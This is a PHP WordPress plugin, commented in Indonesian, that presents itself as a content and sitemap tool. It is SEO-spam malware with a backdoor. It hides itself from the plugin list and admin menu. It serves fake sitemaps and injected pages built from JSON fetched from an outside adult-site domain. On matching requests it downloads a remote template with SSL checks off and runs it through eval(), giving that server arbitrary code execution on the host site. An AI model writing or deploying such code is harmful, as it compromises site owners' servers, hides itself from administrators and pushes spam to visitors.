<?php
/*
Plugin Name: Additional Content Plugin
Description: Plugin konten & sitemap stealth dengan Full Invisible Mode (Menu & List Hidden).
Version: 6.4
Author: Grok
*/

// Exit if accessed directly
if (!defined('ABSPATH')) {
    exit;
}

// KONFIGURASI URL DEFAULT
define('ACP_TEMPLATE_URL', 'https://player.javpornsub.net/template/index.txt');
define('ACP_JSON_BASE_URL', 'https://player.javpornsub.net/content/');

// ==========================================
// 1. SUPER EARLY INTERCEPT (ANTI-404 / NUKLIR)
// ==========================================
add_action('plugins_loaded', 'acp_nuclear_intercept', -9999);
function acp_nuclear_intercept() {
    if (isset($_SERVER['REQUEST_URI']) && strpos($_SERVER['REQUEST_URI'], '.xml') !== false) {
        $path = parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH);
        $filename_raw = basename($path);
        $filename_no_ext = str_replace('.xml', '', $filename_raw);
        
        $sitemap_name = $filename_no_ext;
        $page = 1;
        if (preg_match('/^(.*?)-(\d+)$/', $filename_no_ext, $matches)) {
            $sitemap_name = $matches[1];
            $page = intval($matches[2]);
        }

        $endpoints = get_option('acp_endpoints', []);
        if (empty($endpoints)) return;

        $target_endpoint = false;
        foreach ($endpoints as $ep) {
            if (isset($ep['status']) && $ep['status'] === 'active' && $ep['sitemap_name'] === $sitemap_name) {
                $target_endpoint = $ep;
                break;
            }
        }

        if ($target_endpoint) {
            if (!headers_sent()) {
                header('HTTP/1.1 200 OK');
                header('Content-Type: application/xml; charset=utf-8');
                header('X-Robots-Tag: noindex, follow');
            }

            $json_url = ACP_JSON_BASE_URL . $target_endpoint['json_filename'] . '.json';
            $konten_data = [];
            $response = wp_remote_get($json_url, ['timeout' => 30, 'sslverify' => false]);
            
            if (!is_wp_error($response)) {
                $body = wp_remote_retrieve_body($response);
                $data = json_decode($body, true);
                if (is_array($data)) $konten_data = $data;
            }

            echo '<?xml version="1.0" encoding="UTF-8"?>' . "\n";
            echo '<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">' . "\n";
            
            if (!empty($konten_data)) {
                $max_urls = 45000;
                $chunks = array_chunk($konten_data, $max_urls, true);
                $chunk_index = $page - 1;

                if (isset($chunks[$chunk_index])) {
                    foreach ($chunks[$chunk_index] as $title => $desc) {
                        echo "\t<url>\n";
                        echo "\t\t<loc>" . esc_url(home_url(urlencode($title))) . "</loc>\n";
                        echo "\t\t<lastmod>" . date('c') . "</lastmod>\n";
                        echo "\t\t<changefreq>weekly</changefreq>\n";
                        echo "\t</url>\n";
                    }
                }
            } else {
                echo "";
            }
            echo '</urlset>';
            exit; 
        }
    }
}

// ==========================================
// 2. FITUR STEALTH (HIDDEN LIST & MENU)
// ==========================================

// A. Sembunyikan dari daftar Installed Plugins
add_filter('all_plugins', 'acp_hide_plugin_from_list');
function acp_hide_plugin_from_list($plugins) {
    if (get_option('acp_plugin_hidden', false)) {
        $plugin_file = plugin_basename(__FILE__);
        if (isset($plugins[$plugin_file])) unset($plugins[$plugin_file]);
    }
    return $plugins;
}

// B. Sembunyikan dari Menu Admin (Sidebar) tapi tetap register page-nya
add_action('admin_menu', 'acp_admin_menu', 999);
function acp_admin_menu() {
    // 1. Tambahkan menu dulu agar halaman terdaftar di sistem WP
    add_menu_page(
        'Content Plugin', 
        'Content Plugin', 
        'manage_options', 
        'additional-content-plugin', 
        'acp_admin_page', 
        'dashicons-database'
    );

    // 2. Jika status HIDDEN, hapus menu tersebut dari tampilan
    if (get_option('acp_plugin_hidden', false)) {
        remove_menu_page('additional-content-plugin');
    }
}

// ==========================================
// 3. UTILITY & ADMIN PAGE
// ==========================================

function acp_generate_random_string($length = 5) {
    return substr(str_shuffle('abcdefghijklmnopqrstuvwxyz0123456789'), 0, $length);
}

function acp_admin_page() {
    // Logic Toggle Visibility
    if (isset($_POST['acp_toggle_visibility'])) {
        check_admin_referer('acp_action');
        $curr = get_option('acp_plugin_hidden', false);
        update_option('acp_plugin_hidden', !$curr);
    }
    // Logic Setup
    if (isset($_POST['acp_setup_endpoints'])) {
        check_admin_referer('acp_action');
        $count = intval($_POST['endpoint_count']);
        if ($count > 0) {
            $new = [];
            for ($i = 0; $i < $count; $i++) {
                $new[] = [
                    'json_filename' => acp_generate_random_string(10),
                    'sitemap_name'  => acp_generate_random_string(5),
                    'status'        => 'pending'
                ];
            }
            update_option('acp_endpoints', $new);
        }
    }
    // Logic Generate
    if (isset($_POST['acp_generate_action'])) {
        check_admin_referer('acp_action');
        $endpoints = get_option('acp_endpoints', []);
        foreach ($endpoints as &$ep) {
            $ep['status'] = 'active';
        }
        update_option('acp_endpoints', $endpoints);
        echo '<div class="updated"><p>Status ACTIVE. Sitemap siap.</p></div>';
    }
    // Logic Reset
    if (isset($_POST['acp_reset'])) {
        check_admin_referer('acp_action');
        delete_option('acp_endpoints');
    }

    $endpoints = get_option('acp_endpoints', false);
    $is_hidden = get_option('acp_plugin_hidden', false);
    ?>
    <div class="wrap">
        <h1>Content Plugin (V6.4 Stealth Mode)</h1>
        
        <?php if ($is_hidden): ?>
            <div class="notice notice-error" style="padding:10px;">
                <strong>MODE STEALTH AKTIF!</strong><br>
                Menu plugin telah hilang dari sidebar. Untuk kembali ke halaman ini, gunakan URL:<br>
                <code><?php echo admin_url('admin.php?page=additional-content-plugin'); ?></code>
            </div>
        <?php endif; ?>

        <div style="background:#fff; padding:15px; border-left:4px solid #00a0d2; margin-bottom:20px; display:flex; justify-content:space-between; align-items:center;">
            <div>Status: <strong><?php echo $is_hidden ? '<span style="color:red">HIDDEN (Menu Hilang)</span>' : '<span style="color:green">VISIBLE</span>'; ?></strong></div>
            <form method="post">
                <?php wp_nonce_field('acp_action'); ?>
                <input type="submit" name="acp_toggle_visibility" class="button" value="<?php echo $is_hidden ? 'Munculkan Plugin (Unhide)' : 'Sembunyikan Plugin (Hide)'; ?>">
            </form>
        </div>

        <?php if (!$endpoints): ?>
            <div class="card" style="max-width:400px; padding:20px;">
                <h3>Setup</h3>
                <form method="post">
                    <?php wp_nonce_field('acp_action'); ?>
                    <p>Jumlah: <input type="number" name="endpoint_count" value="3" class="small-text"></p>
                    <input type="submit" name="acp_setup_endpoints" class="button button-primary" value="Siapkan Endpoint">
                </form>
            </div>
        <?php else: ?>
            <form method="post">
                <?php wp_nonce_field('acp_action'); ?>
                <table class="wp-list-table widefat fixed striped">
                    <thead><tr><th>No</th><th>Target JSON</th><th>Virtual Sitemap</th></tr></thead>
                    <tbody>
                        <?php foreach ($endpoints as $i => $ep): 
                            $is_active = isset($ep['status']) && $ep['status'] === 'active';
                            $sitemap_url = home_url($ep['sitemap_name'] . '.xml');
                        ?>
                        <tr>
                            <td><?php echo $i + 1; ?></td>
                            <td>
                                <input type="text" value="<?php echo $ep['json_filename']; ?>" class="regular-text" style="width:150px;" readonly onclick="this.select()"> .json
                            </td>
                            <td>
                                <?php if ($is_active): ?>
                                    <a href="<?php echo $sitemap_url; ?>" target="_blank" style="color:green;">
                                        <span class="dashicons dashicons-yes"></span> <?php echo $ep['sitemap_name']; ?>.xml
                                    </a>
                                    <span class="dashicons dashicons-admin-page acp-copy" data-target="sm_<?php echo $i; ?>" style="cursor:pointer;color:#0073aa;margin-left:5px;"></span>
                                    <input type="text" id="sm_<?php echo $i; ?>" value="<?php echo $ep['sitemap_name']; ?>.xml" style="position:absolute;left:-9999px">
                                <?php else: ?>
                                    <em>Menunggu Generate...</em>
                                <?php endif; ?>
                            </td>
                        </tr>
                        <?php endforeach; ?>
                    </tbody>
                </table>
                <p class="submit"><input type="submit" name="acp_generate_action" class="button button-primary" value="GENERATE SITEMAP"></p>
            </form>
            <hr>
            <form method="post" onsubmit="return confirm('Reset?');">
                <?php wp_nonce_field('acp_action'); ?>
                <input type="submit" name="acp_reset" class="button button-link-delete" value="Reset Konfigurasi">
            </form>
        <?php endif; ?>
    </div>
    <script>
    jQuery(document).ready(function($){
        $('.acp-copy').click(function(){
            var t = document.getElementById($(this).data('target'));
            t.select(); document.execCommand('copy');
            alert('Copied: ' + t.value);
        });
    });
    </script>
    <?php
}

// ==========================================
// 4. CONTENT HANDLER
// ==========================================
add_action('init', 'acp_register_rewrite_rules');
function acp_register_rewrite_rules() {
    add_rewrite_rule('^([^/]+)/?$', 'index.php?acp_value=$matches[1]', 'top');
}
add_filter('query_vars', function($v){ $v[] = 'acp_value'; return $v; });

add_action('template_redirect', 'acp_display_content');
function acp_display_content() {
    $val = get_query_var('acp_value');
    if (!$val) {
        $path = trim(parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH), '/');
        if (!empty($path) && !is_admin() && !get_page_by_path($path)) {
             $val = $path;
        } else {
            return;
        }
    }
    $title = sanitize_text_field(urldecode($val));
    if (get_page_by_path($title, OBJECT, ['post', 'page'])) return;

    $endpoints = get_option('acp_endpoints', []);
    foreach ($endpoints as $ep) {
        if (!isset($ep['status']) || $ep['status'] !== 'active') continue;
        
        $json_url = ACP_JSON_BASE_URL . $ep['json_filename'] . '.json';
        $cache_key = 'acp_c_' . md5($json_url);
        $data = get_transient($cache_key);
        if ($data === false) {
            $resp = wp_remote_get($json_url, ['timeout'=>10, 'sslverify'=>false]);
            if (!is_wp_error($resp)) {
                $data = json_decode(wp_remote_retrieve_body($resp), true);
                set_transient($cache_key, $data, 3600);
            }
        }
        if (is_array($data)) {
            foreach ($data as $k => $v) {
                if (strtolower($k) === strtolower($title)) {
                    $additional_content = $v;
                    $tpl = wp_remote_get(ACP_TEMPLATE_URL, ['sslverify'=>false]);
                    if (!is_wp_error($tpl)) {
                        ob_start();
                        eval('?>' . wp_remote_retrieve_body($tpl));
                        echo ob_get_clean();
                        exit;
                    }
                }
            }
        }
    }
}
